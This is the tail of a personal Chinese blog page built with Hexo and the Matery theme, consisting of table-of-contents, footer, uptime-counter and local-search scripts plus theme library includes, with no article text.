<script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('3'),
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    

    <div class="container row center-align"
         style="margin-bottom: 15px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2021-2025</span>
            
            <span id="year">2021</span>
            <a href="/about" target="_blank">老叭美食家</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                        class="white-color">256.3k</span>
            
            
            
                
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- 运行天数提醒. -->
            
                <span id="sitetime"> Loading ...</span>
                <script>
                    var calcSiteTime = function () {
                        var seconds = 1000;
                        var minutes = seconds * 60;
                        var hours = minutes * 60;
                        var days = hours * 24;
                        var years = days * 365;
                        var today = new Date();
                        var startYear = "2021";
                        var startMonth = "5";
                        var startDate = "21";
                        var startHour = "0";
                        var startMinute = "0";
                        var startSecond = "0";
                        var todayYear = today.getFullYear();
                        var todayMonth = today.getMonth() + 1;
                        var todayDate = today.getDate();
                        var todayHour = today.getHours();
                        var todayMinute = today.getMinutes();
                        var todaySecond = today.getSeconds();
                        var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
                        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
                        var diff = t2 - t1;
                        var diffYears = Math.floor(diff / years);
                        var diffDays = Math.floor((diff / days) - diffYears * 365);

                        // 区分是否有年份.
                        var language = 'zh-CN';
                        if (startYear === String(todayYear)) {
                            document.getElementById("year").innerHTML = todayYear;
                            var daysTip = 'This site has been running for ' + diffDays + ' days';
                            if (language === 'zh-CN') {
                                daysTip = '本站已运行 ' + diffDays + ' 天';
                            } else if (language === 'zh-HK') {
                                daysTip = '本站已運行 ' + diffDays + ' 天';
                            }
                            document.getElementById("sitetime").innerHTML = daysTip;
                        } else {
                            document.getElementById("year").innerHTML = startYear + " - " + todayYear;
                            var yearsAndDaysTip = 'This site has been running for ' + diffYears + ' years and '
                                + diffDays + ' days';
                            if (language === 'zh-CN') {
                                yearsAndDaysTip = '本站已运行 ' + diffYears + ' 年 ' + diffDays + ' 天';
                            } else if (language === 'zh-HK') {
                                yearsAndDaysTip = '本站已運行 ' + diffYears + ' 年 ' + diffDays + ' 天';
                            }
                            document.getElementById("sitetime").innerHTML = yearsAndDaysTip;
                        }
                    }

                    calcSiteTime();
                </script>
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/laobameishijia" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:994291043@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=994291043" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 994291043" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







</div>
    </div>
</footer>

<div class="progress-bar"></div>
<script language=javascript>
    function siteTime() {
        window.setTimeout("siteTime()", 1000);
        var seconds = 1000;
        var minutes = seconds * 60;
        var hours = minutes * 60;
        var days = hours * 24;
        var years = days * 365;
        var today = new Date();
        var todayYear = today.getFullYear();
        var todayMonth = today.getMonth() + 1;
        var todayDate = today.getDate();
        var todayHour = today.getHours();
        var todayMinute = today.getMinutes();
        var todaySecond = today.getSeconds();
        /* Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
        year - 作为date对象的年份，为4位年份值
        month - 0-11之间的整数，做为date对象的月份
        day - 1-31之间的整数，做为date对象的天数
        hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
        minutes - 0-59之间的整数，做为date对象的分钟数
        seconds - 0-59之间的整数，做为date对象的秒数
        microseconds - 0-999之间的整数，做为date对象的毫秒数 */
        var t1 = Date.UTC(2021, 05, 21, 00, 00, 00); //北京时间2018-2-13 00:00:00
        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
        var diff = t2 - t1;
        var diffYears = Math.floor(diff / years);
        var diffDays = Math.floor((diff / days) - diffYears * 365);
        var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
        var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) / minutes);
        var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours - diffMinutes * minutes) / seconds);
        document.getElementById("sitetime").innerHTML = "本站已运行 " +diffYears+" 年 "+diffDays + " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
    }/*因为建站时间还没有一年，就将之注释掉了。需要的可以取消*/
    siteTime();
</script>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/materialize/materialize.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/masonry/masonry.pkgd.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/aos/aos.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//js/matery.js"></script>

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

    
    <script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    <!--腾讯兔小巢-->
    
    

    

    

    
    <script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/instantpage/instantpage.js" type="module"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
    

</body>

</html>
